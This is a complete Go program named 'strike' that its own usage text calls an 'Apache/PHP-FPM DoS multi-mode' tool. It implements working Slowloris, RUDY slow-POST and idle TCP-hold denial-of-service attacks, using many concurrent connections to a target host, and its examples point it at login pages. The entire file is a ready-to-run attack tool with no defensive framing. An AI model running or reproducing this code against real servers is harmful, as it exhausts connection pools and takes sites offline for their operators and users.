package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"net"
	"os"
	"sync"
	"sync/atomic"
	"time"
)

var (
	mode     = flag.String("mode", "slowloris", "slowloris|rudy|tcphold")
	target   = flag.String("target", "", "host:port (e.g. example.com:443)")
	path     = flag.String("path", "/", "URL path")
	workers  = flag.Int("c", 30, "concurrent connections")
	delay    = flag.Int("delay", 10, "delay between bytes (seconds)")
	duration = flag.Int("duration", 900, "max duration (seconds)")
	sni      = flag.String("sni", "", "TLS SNI (default: host from target)")

	connects  uint64
	disconns  uint64
	bytesSent uint64
)

func main() {
	flag.Parse()
	if *target == "" {
		fmt.Fprintf(os.Stderr, "strike - Apache/PHP-FPM DoS multi-mode\n\n")
		fmt.Fprintf(os.Stderr, "Usage:\n")
		fmt.Fprintf(os.Stderr, "  strike -mode slowloris -target host:443 -c 30\n")
		fmt.Fprintf(os.Stderr, "  strike -mode rudy -target host:443 -path /login.php -c 15\n")
		fmt.Fprintf(os.Stderr, "  strike -mode tcphold -target host:443 -c 20\n\n")
		fmt.Fprintf(os.Stderr, "Flags:\n")
		flag.PrintDefaults()
		os.Exit(1)
	}

	host, _, err := net.SplitHostPort(*target)
	if err != nil {
		host = *target
		*target = host + ":443"
	}
	if *sni == "" {
		*sni = host
	}

	deadline := time.Now().Add(time.Duration(*duration) * time.Second)

	fmt.Fprintf(os.Stderr, "[strike] mode=%s target=%s conns=%d delay=%ds duration=%ds\n",
		*mode, *target, *workers, *delay, *duration)

	// Stats goroutine
	go func() {
		tick := time.NewTicker(10 * time.Second)
		defer tick.Stop()
		for range tick.C {
			fmt.Fprintf(os.Stderr, "[strike] alive_conns=%d connected=%d sent=%dB\n",
				connects-disconns, connects, bytesSent)
		}
	}()

	switch *mode {
	case "slowloris":
		slowloris(deadline)
	case "rudy":
		rudy(deadline)
	case "tcphold":
		tcpHold(deadline)
	default:
		fmt.Fprintf(os.Stderr, "unknown mode: %s\n", *mode)
		os.Exit(1)
	}
}

func tlsConfig() *tls.Config {
	return &tls.Config{
		ServerName:         *sni,
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS12,
	}
}

// ========== Slowloris ==========

func slowloris(deadline time.Time) {
	var wg sync.WaitGroup
	for i := 0; i < *workers; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			slowlorisWorker(id, deadline)
		}(i)
	}
	wg.Wait()
}

func slowlorisWorker(id int, deadline time.Time) {
	conf := tlsConfig()
	// Prepare headers (we'll send these byte by byte)
	headers := fmt.Sprintf(
		"GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0\r\nAccept: */*\r\n",
		*path, *sni)

	for time.Now().Before(deadline) {
		raw, err := net.DialTimeout("tcp", *target, 10*time.Second)
		if err != nil {
			time.Sleep(2 * time.Second)
			continue
		}
		conn := tls.Client(raw, conf)
		if err := conn.Handshake(); err != nil {
			raw.Close()
			time.Sleep(2 * time.Second)
			continue
		}

		atomic.AddUint64(&connects, 1)
		alive := true

		// Send headers byte by byte
		for _, b := range []byte(headers) {
			if time.Now().After(deadline) {
				conn.Close()
				atomic.AddUint64(&disconns, 1)
				return
			}
			if _, err := conn.Write([]byte{b}); err != nil {
				alive = false
				break
			}
			atomic.AddUint64(&bytesSent, 1)
			time.Sleep(time.Duration(*delay) * time.Second)
		}

		// Keep connection alive with bogus headers
		for alive && time.Now().Before(deadline) {
			if _, err := conn.Write([]byte("X-a: b\r\n")); err != nil {
				break
			}
			atomic.AddUint64(&bytesSent, 7)
			time.Sleep(time.Duration(*delay) * time.Second)
		}
		conn.Close()
		atomic.AddUint64(&disconns, 1)
	}
}

// ========== RUDY (Slow POST) ==========

func rudy(deadline time.Time) {
	var wg sync.WaitGroup
	for i := 0; i < *workers; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			rudyWorker(id, deadline)
		}(i)
	}
	wg.Wait()
}

func rudyWorker(id int, deadline time.Time) {
	conf := tlsConfig()
	header := fmt.Sprintf(
		"POST %s HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 99999999\r\nUser-Agent: Mozilla/5.0 Chrome/121.0.0.0\r\nAccept: */*\r\n\r\n",
		*path, *sni)

	for time.Now().Before(deadline) {
		raw, err := net.DialTimeout("tcp", *target, 10*time.Second)
		if err != nil {
			time.Sleep(2 * time.Second)
			continue
		}
		conn := tls.Client(raw, conf)
		if err := conn.Handshake(); err != nil {
			raw.Close()
			time.Sleep(2 * time.Second)
			continue
		}

		atomic.AddUint64(&connects, 1)

		// Send headers at full speed
		if _, err := conn.Write([]byte(header)); err != nil {
			conn.Close()
			atomic.AddUint64(&disconns, 1)
			continue
		}

		// Send body 1 byte at a time, very slowly
		for time.Now().Before(deadline) {
			if _, err := conn.Write([]byte("X")); err != nil {
				break
			}
			atomic.AddUint64(&bytesSent, 1)
			time.Sleep(time.Duration(*delay) * time.Second)
		}
		conn.Close()
		atomic.AddUint64(&disconns, 1)
	}
}

// ========== TCP Hold ==========

func tcpHold(deadline time.Time) {
	var wg sync.WaitGroup
	for i := 0; i < *workers; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			tcpHoldWorker(id, deadline)
		}(i)
	}
	wg.Wait()
}

func tcpHoldWorker(id int, deadline time.Time) {
	for time.Now().Before(deadline) {
		conn, err := net.DialTimeout("tcp", *target, 10*time.Second)
		if err != nil {
			time.Sleep(2 * time.Second)
			continue
		}
		atomic.AddUint64(&connects, 1)

		// Hold TCP connection open, send nothing, block until server closes
		readDeadline := time.Now().Add(120 * time.Second)
		if readDeadline.After(deadline) {
			readDeadline = deadline
		}
		conn.SetReadDeadline(readDeadline)
		buf := make([]byte, 1)
		conn.Read(buf)
		conn.Close()
		atomic.AddUint64(&disconns, 1)
	}
}
